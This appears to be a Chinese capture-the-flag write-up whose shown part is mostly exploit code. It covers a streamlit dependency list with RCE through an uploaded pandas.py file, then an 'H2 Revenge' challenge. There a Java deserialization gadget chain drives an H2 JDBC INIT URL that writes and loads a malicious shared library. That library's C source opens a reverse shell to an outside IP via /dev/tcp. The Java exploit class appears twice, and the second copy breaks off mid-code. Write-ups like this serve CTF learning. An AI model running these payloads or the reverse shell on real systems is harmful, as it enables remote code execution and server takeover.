<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[[package]]</span><br><span class="line">name = <span class="string">&quot;streamlit&quot;</span></span><br><span class="line">version = <span class="string">&quot;1.46.1&quot;</span></span><br><span class="line"><span class="built_in">source</span> = &#123; registry = <span class="string">&quot;https://pypi.tuna.tsinghua.edu.cn/simple&quot;</span> &#125;</span><br><span class="line">dependencies = [</span><br><span class="line">    &#123; name = <span class="string">&quot;altair&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;blinker&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;cachetools&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;click&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;gitpython&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;numpy&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;packaging&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;pandas&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;pillow&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;protobuf&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;pyarrow&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;pydeck&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;requests&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;tenacity&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;toml&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;tornado&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;typing-extensions&quot;</span> &#125;,</span><br><span class="line">    &#123; name = <span class="string">&quot;watchdog&quot;</span>, marker = <span class="string">&quot;sys_platform != &#x27;darwin&#x27;&quot;</span> &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>这些依赖全试试，发现在网页询问ai时会第一次调用 pandas的dataframe，从而可控</p>
<p>即 &#x2F;app 下传入 pandas.py 文件实现rce</p>
<h3 id="H2-Revenge"><a href="#H2-Revenge" class="headerlink" title="H2 Revenge"></a>H2 Revenge</h3><p>接着上一道的h2 数据库  </p>
<p> <a target="_blank" rel="noopener" href="https://exp10it.io/2024/03/solarwinds-security-event-manager-amf-deserialization-rce-cve-2024-0692/#%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84-jdbc-h2-rce">SolarWinds Security Event Manager AMF 反序列化 RCE (CVE-2024-0692)</a></p>
<p>类似的环境 java 17 没有javac 不能动态加载恶意命令，那么就得走远程调用方式</p>
<p>先通过反序列化触发DataSource.getConnection()，从而建立 H2 连接并执行恶意 SQL</p>
<p>构造含 H2 恶意 URL 的数据源→创建 JDK 代理 代理 DataSource 转发至 getConnection→POJONode 包装代理→反射篡改 UndoManager edits 设为含 POJONode 的 Vector→反射篡改 EventListenerList listenerList 设为 [Class.class, 篡改后的 UndoManager]→序列化 EventListenerList</p>
<p>序列化使用到 POJNode 类</p>
<p>以下给出给出反射方法解决 POJNode 不能序列化问题</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">ctClass.removeMethod(writeReplace);</span><br><span class="line">ctClass.toClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// vm设置 --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.desktop/javax.swing.undo=ALL-UNNAMED --add-opens java.desktop/javax.swing.event=ALL-UNNAMED</span></span><br></pre></td></tr></table></figure>

<ul>
<li>.so 加载</li>
</ul>
<p>java.lang.System.load</p>
<p>java能够直接加载动态链接库,无需ld_preload</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/168.138.12.74/21431 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc -shared -fPIC exp.c -o exp.so</span></span><br><span class="line">package challenge;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line">import org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"></span><br><span class="line">import javax.sql.DataSource;</span><br><span class="line">import javax.swing.event.EventListenerList;</span><br><span class="line">import javax.swing.undo.UndoManager;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">import java.lang.Class;</span><br><span class="line">import java.lang.ClassLoader;</span><br><span class="line"></span><br><span class="line">import org.springframework.util.FileCopyUtils;</span><br><span class="line"></span><br><span class="line">import org.springframework.util.ResourceUtils;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EXP</span> &#123;</span></span><br><span class="line">    public <span class="type">static</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        CtClass ctClass = ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        CtMethod writeReplace = ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        POJONode node = new POJONode(makeTemplatesImplAopProxy());</span><br><span class="line">        Object eventListener = eventListenerList(node);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(eventListener);        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">    private <span class="type">static</span> String <span class="title function_">bytesToHex</span><span class="params">(byte[] bytes)</span> &#123;</span><br><span class="line">        StringBuilder hexString = new StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">            hexString.append(String.format(<span class="string">&quot;%02X&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> Object <span class="title function_">eventListenerList</span><span class="params">(Object obj)</span> throws Exception &#123;</span><br><span class="line">        EventListenerList <span class="built_in">list</span> = new EventListenerList();</span><br><span class="line">        UndoManager manager = new UndoManager();</span><br><span class="line">        Field edits =  getFuckField(manager.getClass(), <span class="string">&quot;edits&quot;</span>); </span><br><span class="line">        Vector <span class="built_in">vector</span> = new Vector&lt;&gt;();</span><br><span class="line">        <span class="built_in">vector</span>.add(obj);</span><br><span class="line">        edits.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        edits.<span class="built_in">set</span>(manager, <span class="built_in">vector</span>);</span><br><span class="line">        setFieldValue(<span class="built_in">list</span>, <span class="string">&quot;listenerList&quot;</span>, new Object[]&#123;Class.class, manager&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> <span class="type">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj1,String str,Object obj2)</span> throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Field field2 = obj1.getClass().getDeclaredField(str);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.<span class="built_in">set</span>(obj1, obj2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> Field <span class="title function_">getFuckField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> Object <span class="title function_">makeTemplatesImplAopProxy</span><span class="params">()</span> throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        AdvisedSupport advisedSupport = new AdvisedSupport();</span><br><span class="line">        List&lt;String&gt; urls = new ArrayList&lt;String&gt;();</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS Introspection&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS CLASS_FOR_NAME&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS createInstance&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS FILECOPY&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS CREATE_FILE&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS LOAD&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS CREATE_FILE FOR &#x27;org.springframework.util.ResourceUtils.getFile(java.lang.String)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS Introspection FOR &#x27;org.apache.tomcat.util.IntrospectionUtils.callMethodN(java.lang.Object,java.lang.String,java.lang.Object[],java.lang.Class[])&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS CLASS_FOR_NAME FOR &#x27;java.lang.Class.forName(java.lang.String)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS createInstance FOR &#x27;com.fasterxml.jackson.databind.util.ClassUtil.createInstance(java.lang.Class,boolean)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS FILECOPY FOR &#x27;org.springframework.util.FileCopyUtils.copy(byte[],java.io.File)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS LOAD FOR &#x27;java.lang.System.load(java.lang.String)&#x27;&quot;</span>);</span><br><span class="line">        String prefix=<span class="string">&quot;/tmp/test.so&quot;</span>;</span><br><span class="line">        FileInputStream fis = new FileInputStream(<span class="string">&quot;C:\\Users\\admIn\\Documents\\java1\\h2rev\\EXP.so&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">        byte[] buffer = new byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = fis.read(buffer)) != <span class="number">-1</span>) &#123;</span><br><span class="line">            bos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] fileContent = bos.toByteArray();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String hexContent = bytesToHex(fileContent);</span><br><span class="line"></span><br><span class="line">        urls.add(<span class="string">&quot;SET @file=CREATE_FILE(&#x27;&quot;</span>+prefix+<span class="string">&quot;&#x27;)&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CALL FILECOPY(X&#x27;&quot;</span> + hexContent + <span class="string">&quot;&#x27;, @file)&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CALL LOAD(&#x27;/tmp/test.so&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String evil = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(String command:urls)&#123;</span><br><span class="line">            evil += command+<span class="string">&quot;\\;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String url=<span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=&quot;</span>;</span><br><span class="line">        MyDataSource myDataSource = new MyDataSource(url+evil, <span class="string">&quot;aa&quot;</span>, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        advisedSupport.setTarget(myDataSource);</span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;DataSource.class&#125;, handler);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">package challenge;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import javassist.CtMethod;</span><br><span class="line">import org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"></span><br><span class="line">import javax.sql.DataSource;</span><br><span class="line">import javax.swing.event.EventListenerList;</span><br><span class="line">import javax.swing.undo.UndoManager;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">import java.lang.Class;</span><br><span class="line">import java.lang.ClassLoader;</span><br><span class="line"></span><br><span class="line">import org.springframework.util.FileCopyUtils;</span><br><span class="line"></span><br><span class="line">import org.springframework.util.ResourceUtils;</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EXP</span> &#123;</span></span><br><span class="line">    public <span class="type">static</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        CtClass ctClass = ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        CtMethod writeReplace = ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line"></span><br><span class="line">        POJONode node = new POJONode(makeTemplatesImplAopProxy());</span><br><span class="line">        Object eventListener = eventListenerList(node);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(eventListener);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="type">static</span> String <span class="title function_">bytesToHex</span><span class="params">(byte[] bytes)</span> &#123;</span><br><span class="line">        StringBuilder hexString = new StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (byte b : bytes) &#123;</span><br><span class="line">            hexString.append(String.format(<span class="string">&quot;%02X&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> Object <span class="title function_">eventListenerList</span><span class="params">(Object obj)</span> throws Exception &#123;</span><br><span class="line">        EventListenerList <span class="built_in">list</span> = new EventListenerList();</span><br><span class="line">        UndoManager manager = new UndoManager();</span><br><span class="line">        Field edits =  getFuckField(manager.getClass(), <span class="string">&quot;edits&quot;</span>);</span><br><span class="line">        Vector <span class="built_in">vector</span> = new Vector&lt;&gt;();</span><br><span class="line">        <span class="built_in">vector</span>.add(obj);</span><br><span class="line"></span><br><span class="line">        edits.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        edits.<span class="built_in">set</span>(manager, <span class="built_in">vector</span>);</span><br><span class="line">        setFieldValue(<span class="built_in">list</span>, <span class="string">&quot;listenerList&quot;</span>, new Object[]&#123;Class.class, manager&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> <span class="type">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj1,String str,Object obj2)</span> throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Field field2 = obj1.getClass().getDeclaredField(str);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.<span class="built_in">set</span>(obj1, obj2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> Field <span class="title function_">getFuckField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">        Field declaredField;</span><br><span class="line">        <span class="keyword">while</span> (clazz != Object.class) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                declaredField = clazz.getDeclaredField(fieldName);</span><br><span class="line">                declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> declaredField;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            clazz = clazz.getSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="type">static</span> Object <span class="title function_">makeTemplatesImplAopProxy</span><span class="params">()</span> throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        AdvisedSupport advisedSupport = new AdvisedSupport();</span><br><span class="line">        List&lt;String&gt; urls = new ArrayList&lt;String&gt;();</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS Introspection&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS CLASS_FOR_NAME&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS createInstance&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS FILECOPY&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS CREATE_FILE&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;DROP ALIAS IF EXISTS LOAD&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS CREATE_FILE FOR &#x27;org.springframework.util.ResourceUtils.getFile(java.lang.String)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS Introspection FOR &#x27;org.apache.tomcat.util.IntrospectionUtils.callMethodN(java.lang.Object,java.lang.String,java.lang.Object[],java.lang.Class[])&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS CLASS_FOR_NAME FOR &#x27;java.lang.Class.forName(java.lang.String)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS createInstance FOR &#x27;com.fasterxml.jackson.databind.util.ClassUtil.createInstance(java.lang.Class,boolean)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS FILECOPY FOR &#x27;org.springframework.util.FileCopyUtils.copy(byte[],java.io.File)&#x27;&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CREATE ALIAS LOAD FOR &#x27;java.lang.System.load(java.lang.String)&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String prefix=<span class="string">&quot;/tmp/test.so&quot;</span>;</span><br><span class="line">        FileInputStream fis = new FileInputStream(<span class="string">&quot;C:\\Users\\admIn\\Documents\\java1\\h2rev\\EXP.so&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">        byte[] buffer = new byte[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = fis.read(buffer)) != <span class="number">-1</span>) &#123;</span><br><span class="line">            bos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] fileContent = bos.toByteArray();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String hexContent = bytesToHex(fileContent);</span><br><span class="line"></span><br><span class="line">        urls.add(<span class="string">&quot;SET @file=CREATE_FILE(&#x27;&quot;</span>+prefix+<span class="string">&quot;&#x27;)&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CALL FILECOPY(X&#x27;&quot;</span> + hexContent + <span class="string">&quot;&#x27;, @file)&quot;</span>);</span><br><span class="line">        urls.add(<span class="string">&quot;CALL LOAD(&#x27;/tmp/test.so&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String evil = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(String command:urls)&#123;</span><br><span class="line">            evil += command+<span class="string">&quot;\\;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span 